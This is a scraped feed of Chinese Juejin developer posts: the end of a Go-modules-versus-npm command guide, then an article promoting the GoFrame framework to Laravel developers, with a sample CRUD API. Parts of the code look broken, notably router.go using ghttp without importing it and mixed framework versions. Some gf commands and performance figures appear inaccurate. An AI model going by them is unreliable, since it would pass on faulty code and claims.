<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/gin-gonic/gin"</span>
</code></pre>
</li>
<li>
<p>2️⃣ 清理无用依赖</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> mod tidy
</code></pre>
</li>
<li>
<p>👉 Go 会：</p>
<ul>
<li>删除未使用依赖</li>
<li>更新 go.mod</li>
<li>清理 go.sum</li>
</ul>
</li>
<li>
<p>对照</p>













<table><thead><tr><th>npm</th><th>Go</th></tr></thead><tbody><tr><td>npm uninstall lodash</td><td>删除 import + go mod tidy</td></tr></tbody></table>
</li>
</ul>
<hr/>
<h2 data-id="heading-4">四、同步 / 拉起老项目（= npm install）</h2>
<ul>
<li>
<p>✅ 克隆老项目后</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> xxx
<span class="hljs-built_in">cd</span> project
</code></pre>
</li>
<li>
<p>直接下载依赖</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> mod download
</code></pre>
<p>或直接：</p>
<pre><code class="hljs language-arduino" lang="arduino">go run .
</code></pre>
<p>👉 自动按 go.mod 下载全部依赖</p>
</li>
<li>
<p>🔥 推荐指令（最稳）</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> mod tidy
</code></pre>
<p>它会：</p>
<ul>
<li>下载缺失依赖</li>
<li>移除多余依赖</li>
<li>保证 go.mod / go.sum 干净</li>
</ul>
</li>
<li>
<p>对照</p>













<table><thead><tr><th>npm</th><th>Go</th></tr></thead><tbody><tr><td>npm install</td><td>go mod tidy</td></tr></tbody></table>
</li>
</ul>
<hr/>
<h2 data-id="heading-5">五、查看 / 管理依赖（实用）</h2>
<ul>
<li>
<p>查看当前依赖</p>
<pre><code class="hljs language-css" lang="css">go list -m <span class="hljs-attribute">all</span>
</code></pre>
</li>
<li>
<p>查看依赖树</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> mod graph
</code></pre>
</li>
<li>
<p>为什么引入了这个包</p>
<pre><code class="hljs language-matlab" lang="matlab">go <span class="hljs-built_in">mod</span> <span class="hljs-built_in">why</span> github.com/gin-gonic/gin
</code></pre>
</li>
</ul>
<h2 data-id="heading-6">六、升级 / 降级 / 锁版本（进阶）</h2>
<ul>
<li>
<p>升级全部依赖</p>
<pre><code class="hljs language-arduino" lang="arduino">go get -u ./...
</code></pre>
</li>
<li>
<p>只升级直接依赖</p>
<pre><code class="hljs language-arduino" lang="arduino">go get -u
</code></pre>
</li>
<li>
<p>降级到指定版本</p>
<pre><code class="hljs language-kotlin" lang="kotlin">go <span class="hljs-keyword">get</span> github.com/gin-gonic/<span class="hljs-symbol">gin@</span>v1<span class="hljs-number">.9</span><span class="hljs-number">.0</span>
</code></pre>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[都2026年了，PHP还纠结转Go还是Java呢？安利一个无缝迁移的框架~]]></title>    <link>https://juejin.cn/post/7584244431869018139</link>    <guid>https://juejin.cn/post/7584244431869018139</guid>    <pubDate>2025-12-16T07:51:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584244431869018139" data-draft-id="7584244431868772379" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="都2026年了，PHP还纠结转Go还是Java呢？安利一个无缝迁移的框架~"/> <meta itemprop="keywords" content="后端,Go,Java"/> <meta itemprop="datePublished" content="2025-12-16T07:51:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="王中阳讲AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/2189882892232029"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            都2026年了，PHP还纠结转Go还是Java呢？安利一个无缝迁移的框架~
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2189882892232029/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    王中阳讲AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:51:31.000Z" title="Tue Dec 16 2025 07:51:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;font-weight:400;line-height:2;font-size:17px;overflow-x:hidden;color:#000}.markdown-body strong{padding:1px;color:#ee3f4d}.markdown-body em{padding:0 2px;color:#f33b1f}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:30px;margin-bottom:20px;line-height:1.5;font-weight:700}.markdown-body h1{text-align:center;padding-bottom:5px;font-size:32px;color:#ac1f18}.markdown-body h1:after{content:"";display:block;margin:4px auto 0;width:100px;height:2px;border-bottom:2px solid #f33b1f}.markdown-body h2{font-size:28px;border-bottom:1px solid #f33b1f}.markdown-body h2:before{content:"# "!important;color:#f33b1f}.markdown-body h3{font-size:24px;padding-left:9px;border-left:6px solid #f33b1f}.markdown-body h4{font-size:20px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #bbb;margin:16px 0}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f9f1db;color:#ee2746;border-radius:2px;font-size:16px;padding:1px 2px}.markdown-body code,.markdown-body pre{font-family:-apple-system,-apple-system-body,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,PingFang SC,思源黑体 CN,思源黑体,JetBrains Mono,Fira Code,Menlo,Ubuntu Mono,Consolas,sans-serif}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{margin:12px 0!important;border-radius:3px;font-size:15px;padding:16px 12px;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f7f7f7}.markdown-body a{text-decoration:none;color:#1781b5;padding:0 2px;border-bottom:1px solid #1781b5}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #f33b1f;color:#ac1f18}.markdown-body blockquote{color:#3d3d3d;background-color:#fff9f9;padding:6px 16px;margin:16px 0;border-left:3px solid #f07c82}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:6px 0}.markdown-body ol,.markdown-body ul{padding-left:30px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:6px}.markdown-body ol li{padding-left:6px}.markdown-body ::marker{color:#f33b1f}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body .task-list-item input[type=checkbox]{position:relative}.markdown-body .task-list-item input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background:#fff;border:1px solid #f07c82;border-radius:3px;box-sizing:border-box;z-index:1}.markdown-body .task-list-item input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-5px;left:0;right:0;bottom:0;width:0;height:0;color:#f33b1f;font-size:16px;font-weight:700;z-index:2}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border-spacing:0;border-collapse:collapse}.markdown-body table thead{background:#fff9f9;color:#000;text-align:left;font-size:15px}.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table tr:hover{background-color:#fff9f9}.markdown-body table td,.markdown-body table th{padding:12px 7px;line-height:24px;border:1px solid #f9f1db}.markdown-body table td{min-width:120px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><blockquote>
<p>最近贼有意思，发现了一个账号，专门发PHP转Go的帖子，哎呦喂，这不正是我3年前做的事情吗？哈哈。</p>
</blockquote>
<p>尤其看到他写的安利GoFrame教程的文章，有点刺激到我了，一看他就没我用的多，用的溜，因为我不仅在公司用GoFrame做过商业项目，还写过专栏，出过教程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab148605d1024114ac36600b3f01207d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546L5Lit6Ziz6K6yQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476291&amp;x-signature=ylimhSaYv9JHeCGn9vBHoWoJh3I%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a5211ea8c8b43afaaee45881ce0bbb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546L5Lit6Ziz6K6yQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476291&amp;x-signature=tcarKbW%2B1fXNTiCmlRHlPzB89qM%3D" alt="image.png" loading="lazy"/></p>
<p>作为一名<strong>深耕PHP多年</strong>的开发者，Laravel的<strong>优雅与高效</strong>早已刻入我的开发习惯。当业务需求朝着<strong>高并发、高性能</strong>方向升级，Go语言成为必然选择时，我却一度陷入"用惯了Laravel，再写Go总觉得不顺手"的困境——直到邂逅<strong>GoFrame</strong>。这个被誉为Go生态"<strong>瑞士军刀</strong>"的框架，完美复刻了Laravel的开发体验，又兼具Go语言的<strong>原生优势</strong>，让我在转型路上少走了无数弯路。今天就来拆解<strong>GoFrame为何能成为PHP开发者的Go语言入门首选</strong>，以及如何快速上手实践。</p>
<h2 data-id="heading-0">一、GoFrame：Laravel开发者的"他乡故知"</h2>
<p>GoFrame最打动PHP开发者的，是它与Laravel<strong>一脉相承的设计理念</strong>。很多用过的开发者都戏称它是"<strong>Go版Laravel</strong>"，这种亲切感源于两者在核心功能上的<strong>高度契合</strong>：</p>
<h3 data-id="heading-1">1. 如出一辙的ORM操作</h3>
<p>Laravel的<strong>Eloquent ORM</strong>是其核心亮点之一，而GoFrame的ORM设计几乎做到了"<strong>无缝衔接</strong>"。同样支持<strong>链式调用</strong>，同样<strong>简洁直观</strong>的查询语法，让习惯了Laravel的开发者无需重新适应：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// GoFrame查询示例</span>
user, err := g.Model(<span class="hljs-string">"user"</span>).Where(<span class="hljs-string">"id"</span>, <span class="hljs-number">1</span>).One()
activeUsers, err := g.Model(<span class="hljs-string">"user"</span>).Where(<span class="hljs-string">"status"</span>, <span class="hljs-number">1</span>).Order(<span class="hljs-string">"create_at desc"</span>).All()

<span class="hljs-comment">// 对比Laravel的Eloquent</span>
$user = User::where(<span class="hljs-string">'id'</span>, <span class="hljs-number">1</span>)-&gt;first();
$activeUsers = User::where(<span class="hljs-string">'status'</span>, <span class="hljs-number">1</span>)-&gt;orderBy(<span class="hljs-string">'create_at'</span>, <span class="hljs-string">'desc'</span>)-&gt;get();
</code></pre>
<p>这种<strong>语法上的相似度</strong>，让开发者能瞬间代入，极大降低了<strong>学习成本</strong>。</p>
<h3 data-id="heading-2">2. 功能对等的命令行工具</h3>
<p>Laravel的<strong>Artisan工具</strong>是提升开发效率的利器，而GoFrame的<code>gf</code>命令行工具在功能上<strong>完全不输</strong>。从<strong>项目初始化</strong>到<strong>代码生成</strong>，再到<strong>热重载运行</strong>，一套命令就能搞定所有基础操作：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># GoFrame gf工具</span>
gf init myapp          <span class="hljs-comment"># 初始化项目（对应laravel new myapp）</span>
gf gen model user      <span class="hljs-comment"># 生成数据模型（对应php artisan make:model User）</span>
gf run                 <span class="hljs-comment"># 热启动项目（无需手动重启，对应laravel serve）</span>

<span class="hljs-comment"># 额外实用功能</span>
gf gen controller user <span class="hljs-comment"># 快速生成控制器</span>
gf sql <span class="hljs-built_in">export</span>          <span class="hljs-comment"># 数据库结构导出</span>
</code></pre>
<p>熟悉的<strong>命令行体验</strong>，让开发者从Laravel切换到GoFrame时<strong>毫无违和感</strong>。</p>
<h3 data-id="heading-3">3. 经典MVC架构复用</h3>
<p>GoFrame沿用了Laravel经典的<strong>MVC（模型-视图-控制器）架构</strong>，路由、控制器、模型的<strong>代码组织方式</strong>与Laravel高度一致。这种<strong>架构上的熟悉感</strong>，让开发者能直接复用此前的<strong>项目结构设计经验</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 路由定义（对应Laravel的routes/api.php）</span>
s.Group(<span class="hljs-string">"/api"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(group *ghttp.RouterGroup)</span></span> {
    group.POST(<span class="hljs-string">"/users"</span>, controller.User.Create)
    group.GET(<span class="hljs-string">"/users/:id"</span>, controller.User.Show)
})

<span class="hljs-comment">// 控制器逻辑（对应Laravel的app/Http/Controllers/UserController）</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *UserController)</span></span> Create(r *ghttp.Request) {
    <span class="hljs-comment">// 接收参数、业务处理、返回响应的流程与Laravel一致</span>
}
</code></pre>
<p>此外，GoFrame的<strong>中间件机制</strong>也与Laravel完全同源，无论是<strong>认证授权</strong>、<strong>日志记录</strong>还是<strong>限流熔断</strong>，都能按照熟悉的方式实现，无需重构<strong>开发思维</strong>。</p>
<h3 data-id="heading-4">4. 更灵活的配置管理</h3>
<p>Laravel的<code>.env</code>配置方式<strong>简洁易用</strong>，但GoFrame在此基础上提供了<strong>更灵活的方案</strong>——支持<strong>yaml、toml、json</strong>等多种格式的配置文件，还能根据<strong>环境（开发、测试、生产）</strong> 自动加载对应配置：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 开发环境配置（config.dev.yaml）</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">address:</span> <span class="hljs-string">":8080"</span>
<span class="hljs-attr">database:</span>
  <span class="hljs-attr">default:</span>
    <span class="hljs-attr">link:</span> <span class="hljs-string">"mysql:root:123456@tcp(127.0.0.1:3306)/dev_db"</span>
    <span class="hljs-attr">debug:</span> <span class="hljs-literal">true</span>

<span class="hljs-comment"># 生产环境配置（config.prod.yaml）</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">address:</span> <span class="hljs-string">":80"</span>
<span class="hljs-attr">database:</span>
  <span class="hljs-attr">default:</span>
    <span class="hljs-attr">link:</span> <span class="hljs-string">"mysql:prod_user:prod_pwd@tcp(10.0.0.1:3306)/prod_db"</span>
    <span class="hljs-attr">debug:</span> <span class="hljs-literal">false</span>
</code></pre>
<p>通过<code>gf env set</code>命令即可<strong>切换环境</strong>，比Laravel手动修改<code>.env</code>更<strong>高效安全</strong>。</p>
<h2 data-id="heading-5">二、GoFrame的独家优势：不止于"像Laravel"</h2>
<p>如果说<strong>相似性</strong>让GoFrame降低了入门门槛，那么这些<strong>独家优势</strong>才是它真正的核心竞争力：</p>
<h3 data-id="heading-6">1. Go原生的高性能</h3>
<p>作为Go语言框架，GoFrame天生继承了Go的<strong>并发优势</strong>。在同等服务器配置下，GoFrame的<strong>QPS（每秒查询率）</strong> 是传统PHP框架的<strong>5-10倍</strong>，内存占用却只有PHP的<strong>1/3</strong>。对于需要处理<strong>高并发请求</strong>的场景（如直播互动、电商秒杀），这种<strong>性能差距</strong>尤为明显。</p>
<h3 data-id="heading-7">2. 真正的模块化设计</h3>
<p>GoFrame的"<strong>全家桶</strong>"并非简单堆砌，而是由多个<strong>可独立使用的模块</strong>组成。除了Web开发必备的ORM、路由、控制器，还包含<strong>缓存、日志、验证、国际化</strong>等全套企业级组件。开发者可以<strong>按需选用</strong>，比如只使用它的ORM模块操作数据库，或用缓存模块替代Redis客户端，<strong>灵活性远超Laravel</strong>。</p>
<h3 data-id="heading-8">3. 完善的中文生态支持</h3>
<p>对于国内开发者而言，GoFrame的<strong>中文文档</strong>堪称"<strong>教科书级别</strong>"——不仅内容详尽，还包含大量针对<strong>国内场景</strong>的优化说明（如MySQL驱动适配、微信支付集成等）。此外，GitHub社区<strong>活跃度极高</strong>，大部分问题都能在<strong>24小时内</strong>找到解决方案，比依赖英文文档的Laravel生态更<strong>接地气</strong>。</p>
<h3 data-id="heading-9">4. 微服务友好型架构</h3>
<p>GoFrame的<strong>模块化设计</strong>天然适合<strong>微服务拆分</strong>。每个业务模块都可以<strong>独立部署、独立扩展</strong>，配合Go语言的<strong>跨平台编译特性</strong>，能轻松实现<strong>多环境部署</strong>。相比之下，Laravel在微服务架构中需要额外引入<strong>第三方组件</strong>，复杂度更高。</p>
<h2 data-id="heading-10">三、快速上手：30分钟搭建完整CRUD API</h2>
<p>说了这么多，不如亲手实践一番。下面以<strong>用户管理API</strong>为例，带你体验GoFrame的<strong>开发流程</strong>：</p>
<h3 data-id="heading-11">1. 环境准备与安装</h3>
<p>首先确保本地已安装<strong>Go 1.18+版本</strong>，然后执行以下命令安装<code>gf</code>工具：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装gf命令行工具</span>
go install github.com/gogf/gf/cmd/gf@latest

<span class="hljs-comment"># 验证安装成功</span>
gf -v
</code></pre>
<h3 data-id="heading-12">2. 初始化项目</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建项目</span>
gf init user-api

<span class="hljs-comment"># 进入项目目录</span>
<span class="hljs-built_in">cd</span> user-api

<span class="hljs-comment"># 启动项目（热重载模式）</span>
gf run
</code></pre>
<p>此时访问<code>http://127.0.0.1:8080</code>，就能看到GoFrame的<strong>默认欢迎页面</strong>，项目初始化完成。</p>
<h3 data-id="heading-13">3. 配置数据库</h3>
<p>编辑项目根目录的<code>config.yaml</code>文件，配置<strong>MySQL连接信息</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">database:</span>
  <span class="hljs-attr">default:</span>
    <span class="hljs-attr">link:</span> <span class="hljs-string">"mysql:root:123456@tcp(127.0.0.1:3306)/user_db"</span>
    <span class="hljs-attr">debug:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">maxIdleConn:</span> <span class="hljs-number">10</span>
    <span class="hljs-attr">maxOpenConn:</span> <span class="hljs-number">100</span>
</code></pre>
<p>确保数据库已创建（可手动创建<code>user_db</code>库），无需提前建表，后续可通过<strong>模型生成工具</strong>自动同步。</p>
<h3 data-id="heading-14">4. 生成模型与控制器</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生成User模型（会自动创建数据表）</span>
gf gen model user -t user -f

<span class="hljs-comment"># 生成User控制器</span>
gf gen controller user
</code></pre>
<p>执行完成后，项目会自动创建<code>model/user.go</code>和<code>controller/user.go</code>文件，无需手动编写<strong>基础代码</strong>。</p>
<h3 data-id="heading-15">5. 定义路由</h3>
<p>编辑<code>router/router.go</code>文件，添加<strong>CRUD路由</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> router

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"user-api/app/controller"</span>
    <span class="hljs-string">"github.com/gogf/gf/frame/g"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> {
    s := g.Server()
    <span class="hljs-comment">// 接口路由组</span>
    s.Group(<span class="hljs-string">"/api/v1"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(group *ghttp.RouterGroup)</span></span> {
        <span class="hljs-comment">// 跨域支持</span>
        group.Middleware(ghttp.MiddlewareCORS)
        <span class="hljs-comment">// 用户管理路由</span>
        group.POST(<span class="hljs-string">"/users"</span>, controller.User.Create)
        group.GET(<span class="hljs-string">"/users/:id"</span>, controller.User.Show)
        group.PUT(<span class="hljs-string">"/users/:id"</span>, controller.User.Update)
        group.DELETE(<span class="hljs-string">"/users/:id"</span>, controller.User.Delete)
        group.GET(<span class="hljs-string">"/users"</span>, controller.User.List)
    })
}
</code></pre>
<h3 data-id="heading-16">6. 完善控制器逻辑</h3>
<p>编辑<code>controller/user.go</code>，补充<strong>业务处理逻辑</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> controller

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"user-api/app/model"</span>
    <span class="hljs-string">"github.com/gogf/gf/net/ghttp"</span>
    <span class="hljs-string">"github.com/gogf/gf/frame/g"</span>
)

<span class="hljs-keyword">type</span> UserController <span class="hljs-keyword">struct</span>{}

<span class="hljs-comment">// 创建用户</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *UserController)</span></span> Create(r *ghttp.Request) {
    <span class="hljs-keyword">var</span> data model.User
    <span class="hljs-keyword">if</span> err := r.Parse(&amp;data); err != <span class="hljs-literal">nil</span> {
        r.Response.WriteJsonExit(g.Map{
            <span class="hljs-string">"code"</span>: <span class="hljs-number">400</span>,
            <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"参数错误："</span> + err.Error(),
        })
    }
    <span class="hljs-comment">// 插入数据库</span>
    result, err := g.Model(<span class="hljs-string">"user"</span>).Insert(&amp;data)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        r.Response.WriteJsonExit(g.Map{
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"创建失败："</span> + err.Error(),
        })
    }
    id, _ := result.LastInsertId()
    r.Response.WriteJsonExit(g.Map{
        <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
        <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"创建成功"</span>,
        <span class="hljs-string">"data"</span>: g.Map{<span class="hljs-string">"id"</span>: id},
    })
}

<span class="hljs-comment">// 获取单个用户</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *UserController)</span></span> Show(r *ghttp.Request) {
    id := r.GetInt(<span class="hljs-string">"id"</span>)
    user, err := g.Model(<span class="hljs-string">"user"</span>).Where(<span class="hljs-string">"id"</span>, id).One()
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        r.Response.WriteJsonExit(g.Map{
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"查询失败："</span> + err.Error(),
        })
    }
    <span class="hljs-keyword">if</span> user.IsEmpty() {
        r.Response.WriteJsonExit(g.Map{
            <span class="hljs-string">"code"</span>: <span class="hljs-number">404</span>,
            <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"用户不存在"</span>,
        })
    }
    r.Response.WriteJsonExit(g.Map{
        <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
        <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"查询成功"</span>,
        <span class="hljs-string">"data"</span>: user,
    })
}

<span class="hljs-comment">// 其他方法（Update、Delete、List）类似，此处省略...</span>
</code></pre>
<h3 data-id="heading-17">7. 启动测试</h3>
<p>执行<code>gf run</code>启动项目，通过<strong>Postman或curl</strong>测试接口：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试创建用户</span>
curl -X POST http://127.0.0.1:8080/api/v1/users \
-H <span class="hljs-string">"Content-Type: application/json"</span> \
-d <span class="hljs-string">'{"name":"test","email":"test@example.com"}'</span>
</code></pre>
<p>返回如下结果即表示成功：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span><span class="hljs-number">200</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"msg"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"创建成功"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-18">四、谁该选择GoFrame？</h2>
<p>经过<strong>3年多的实战体验</strong>，我认为以下几类开发者/团队<strong>最适合使用GoFrame</strong>：</p>
<ol>
<li><strong>PHP/Laravel转Go的开发者</strong>：最低学习成本，最快上手速度，无需重构开发思维；</li>
<li><strong>追求"开发效率+运行性能"的团队</strong>：既想要Laravel式的高效开发，又需要应对高并发场景；</li>
<li><strong>微服务架构项目</strong>：模块化设计适合拆分部署，Go语言的轻量特性降低服务运维成本；</li>
<li><strong>国内中小企业</strong>：中文文档+活跃社区，解决问题更高效，无需依赖海外资源。</li>
</ol>
<p>当然，GoFrame<strong>并非万能</strong>。如果只是开发一个<strong>极简的静态网站或个人工具</strong>，Gin等轻量框架可能更合适；如果项目涉及<strong>复杂的领域驱动设计</strong>，可能需要结合其他工具补充。但对于<strong>绝大多数Web开发场景</strong>，GoFrame的"<strong>不折腾</strong>"哲学——提供全套解决方案但不捆绑开发者——都能带来<strong>极佳的体验</strong>。</p>
<h2 data-id="heading-19">五、最后建议</h2>
<p>如果你正打算从PHP转向Go，或者正在为Go项目选择框架，不妨花一个周末的时间<strong>试试GoFrame</strong>：</p>
<ol>
<li>从<a href="https://link.juejin.cn?target=https%3A%2F%2Fgoframe.org%2F" target="_blank" title="https://goframe.org/" ref="nofollow noopener noreferrer">官方文档</a>的"<strong>快速开始</strong>"入手，熟悉核心概念；</li>
<li>用<code>gf</code>工具创建一个demo项目，亲手实现<strong>简单的CRUD</strong>；</li>
<li>遇到问题时，优先查看GitHub的issue和社区讨论，大部分常见问题都有<strong>成熟解决方案</strong>。</li>
</ol>
<p>就像Laravel当年让PHP开发变得优雅一样，GoFrame也正在让Go的Web开发变得<strong>更高效、更愉悦</strong>。对于PHP开发者而言，它不仅是一个框架，更是一座通往Go语言世界的"<strong>无缝桥梁</strong>"。不妨现在就动手试试，相信你会和我一样，爱上这种"<strong>Laravel式体验+Go级性能</strong>"的开发快感。</p>
<h3 data-id="heading-20">互动话题（欢迎评论区交流）</h3>
<ol>
<li>你也是 PHP 转 Go 的开发者吗？踩过哪些框架坑？</li>
<li>你用 GoFrame 做过哪些项目？有没有隐藏技巧可以分享？</li>
